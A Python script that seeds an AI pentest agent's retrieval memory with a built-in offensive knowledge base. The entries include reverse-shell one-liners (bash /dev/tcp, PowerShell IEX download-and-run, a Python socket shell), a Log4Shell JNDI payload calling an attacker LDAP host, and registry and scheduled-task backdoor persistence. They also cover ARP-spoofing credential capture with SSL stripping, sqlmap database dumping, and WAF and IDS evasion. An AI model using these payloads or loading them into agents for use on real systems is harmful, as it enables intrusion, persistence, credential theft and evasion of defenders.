"""AI Agent Training — train the Adaptive RAG with penetration testing knowledge.

This script seeds the RAG system with pentest knowledge so the agent
can recall proven techniques, tools, and CVE data.

Usage:
    python -m ai_agent.train                     # Train with default knowledge
    python -m ai_agent.train --file my_knowledge.json  # Train from custom file
    python -m ai_agent.train --clear             # Clear RAG memory first
"""

from __future__ import annotations

import argparse
import json
import logging
import sys
from pathlib import Path

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(name)s] %(levelname)s: %(message)s")
logger = logging.getLogger("zahra.ai_agent.train")

from ai_agent.adaptive_rag import AdaptiveRAG


# Default pentest knowledge seed data
DEFAULT_KNOWLEDGE: list[dict[str, str]] = [
    # -- Reconnaissance -------------------------------------------------------
    {
        "category": "recon",
        "content": (
            "Subdomain enumeration: use subfinder -d target.com -silent, "
            "then amass enum -d target.com for deeper discovery. "
            "Validate with httpx -silent to find live hosts."
        ),
    },
    {
        "category": "recon",
        "content": (
            "Port scanning: nmap -sS -T4 -p- target for full scan, "
            "then nmap -sV -sC -p<ports> target for service versions. "
            "For stealth use -T2 and --source-port 53."
        ),
    },
    {
        "category": "recon",
        "content": (
            "DNS enumeration: dig any target.com, dig axfr target.com for zone transfer. "
            "Use dnsrecon -d target.com -t std for comprehensive DNS recon."
        ),
    },
    {
        "category": "recon",
        "content": (
            "Tech fingerprinting: whatweb target.com, wappalyzer for browser, "
            "or curl -I target.com to check headers. Detect CMS with cmseek."
        ),
    },
    # -- Scanning ------------------------------------------------------------
    {
        "category": "scan",
        "content": (
            "Vulnerability scanning: nuclei -u https://target.com -t cves/ "
            "for CVE templates. Use -severity critical,high for triage. "
            "nuclei -u target.com -t exposures/ finds exposed panels."
        ),
    },
    {
        "category": "scan",
        "content": (
            "Web vuln scanning: nikto -h target.com -C all for basic checks. "
            "Use wpscan --url target.com --enumerate for WordPress sites."
        ),
    },
    {
        "category": "scan",
        "content": (
            "Directory brute force: gobuster dir -u target.com -w wordlist.txt "
            "for directories, gobuster dns -d target.com -w subdomains.txt for subdomains. "
            "ffuf -u https://target.com/FUZZ -w wordlist.txt is faster."
        ),
    },
    # -- Exploitation --------------------------------------------------------
    {
        "category": "exploit",
        "content": (
            "SQL injection: sqlmap -u 'http://target.com/item?id=1' --dbs then "
            "--tables -D database_name then --dump. Add --random-agent --delay=1 for evasion."
        ),
    },
    {
        "category": "exploit",
        "content": (
            "Reverse shell payloads: Linux uses bash -i >& /dev/tcp/IP/PORT 0>&1. "
            "Windows uses powershell -nop -c 'IEX(New-Object Net.WebClient).DownloadString(...)'. "
            "Python: python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"IP\",PORT));...'"
        ),
    },
    {
        "category": "exploit",
        "content": (
            "Metasploit: use exploit/multi/http/struts2_rest_xstream, "
            "or search cve:2023 type:exploit. Set RHOSTS, LHOST, then run."
        ),
    },
    # -- C2 / Post-Exploitation ----------------------------------------------
    {
        "category": "c2",
        "content": (
            "Persistence on Windows: reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run "
            "/v backdoor /t REG_SZ /d 'C:\\path\\payload.exe' for startup. "
            "Or create scheduled task: schtasks /create /tn backdoor /tr payload.exe /sc onlogon."
        ),
    },
    {
        "category": "c2",
        "content": (
            "Reverse shell listeners: nc -lvnp PORT for netcat. "
            "metasploit: use exploit/multi/handler, set PAYLOAD windows/meterpreter/reverse_tcp."
        ),
    },
    # -- MITM ----------------------------------------------------------------
    {
        "category": "mitm",
        "content": (
            "ARP spoofing: arpspoof -i eth0 -t TARGET GATEWAY for one direction, "
            "then arpspoof -i eth0 -t GATEWAY TARGET for both. Enable IP forwarding: echo 1 > /proc/sys/net/ipv4/ip_forward."
        ),
    },
    {
        "category": "mitm",
        "content": (
            "Credential capture: bettercap -T arp,arp-spoof --arp-poison TARGET GATEWAY "
            "then use net.sniff module. For HTTPS use sslstrip -f and install the MITM CA cert on the victim."
        ),
    },
    # -- CVE knowledge -------------------------------------------------------
    {
        "category": "cve",
        "content": (
            "CVE-2023-44487: HTTP/2 Rapid Reset — allows RST_STREAM floods causing DoS. "
            "Patch: disable HTTP/2 on the web server."
        ),
    },
    {
        "category": "cve",
        "content": (
            "CVE-2021-44228 (Log4Shell): JNDI injection in Apache Log4j 2.x. "
            "Exploit: ${jndi:ldap://attacker/a}. Detect with nuclei template."
        ),
    },
    {
        "category": "cve",
        "content": (
            "CVE-2023-23397 (Outlook Elevation): NTLM hash leak via calendar invites. "
            "Mitigation: add registry key to block NTLM on Outlook."
        ),
    },
    # -- Evasion techniques --------------------------------------------------
    {
        "category": "evasion",
        "content": (
            "WAF bypass: use --random-agent, chunked transfer encoding, "
            "case randomization, and null bytes. For SQLi bypass use --tamper=space2comment."
        ),
    },
    {
        "category": "evasion",
        "content": (
            "IDS evasion: fragment packets with nmap -f, use decoys -D RND:10, "
            "randomize targets with --randomize-hosts. Slow down timing with -T2."
        ),
    },
]


def train(rag: AdaptiveRAG, knowledge: list[dict[str, str]]) -> int:
    """Train the RAG with knowledge entries."""
    count = 0
    for entry in knowledge:
        rag.store(
            content=entry["content"],
            category=entry.get("category", "general"),
            metadata={k: v for k, v in entry.items() if k not in ("category", "content")},
        )
        count += 1
    return count


def main() -> int:
    """Main entry point."""
    parser = argparse.ArgumentParser(description="Train the AI Agent RAG")
    parser.add_argument("--file", help="JSON file with knowledge to train from")
    parser.add_argument("--clear", action="store_true", help="Clear RAG memory first")
    args = parser.parse_args()

    rag = AdaptiveRAG()

    if args.clear:
        rag.clear()
        logger.info("Cleared RAG memory")

    knowledge = DEFAULT_KNOWLEDGE

    if args.file:
        path = Path(args.file)
        if not path.exists():
            logger.error("File not found: %s", args.file)
            return 1
        custom = json.loads(path.read_text(encoding="utf-8"))
        if isinstance(custom, list):
            knowledge.extend(custom)
        else:
            logger.error("File must contain a list of knowledge entries")
            return 1

    count = train(rag, knowledge)
    stats = rag.stats()

    print(f"\n{'=' * 50}")
    print(f"✅ Trained RAG with {count} knowledge entries")
    print(f"{'=' * 50}")
    print(f"Total entries: {stats['total_entries']}")
    for category, num in stats["categories"].items():
        print(f"  {category}: {num}")
    print(f"Memory file: {stats['persist_path']}")

    # Test a few queries
    print(f"\n{'=' * 50}")
    print("🔍 Test queries:")
    print(f"{'=' * 50}")
    for q in ("nmap port scan", "SQL injection sqlmap", "persistence windows registry", "CVE-2021-44228"):
        results = rag.search(q, top_k=1)
        if results:
            print(f"\n  Query: {q}")
            print(f"  → {results[0]['content'][:120]}...")
        else:
            print(f"\n  Query: {q}")
            print("  → No results")

    print(f"\n✅ Training complete!")
    return 0


if __name__ == "__main__":
    sys.exit(main())